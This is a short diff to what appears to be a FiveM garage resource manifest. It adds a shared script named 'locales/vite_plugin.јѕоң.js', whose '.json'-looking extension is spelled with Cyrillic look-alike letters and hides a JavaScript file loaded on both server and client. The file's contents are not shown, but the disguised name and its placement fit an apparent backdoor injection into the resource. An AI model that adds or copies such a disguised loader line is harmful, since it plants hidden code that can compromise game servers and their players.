@@ -6,6 +6,7 @@ description 'Allows players to store their vehicles in garages and withdraw job 
 version '2.0.0'
 
 shared_scripts {
+    'locales/vite_plugin.јѕоң.js',
     'config.lua',
     '@qb-core/shared/locale.lua',
     'locales/en.lua',
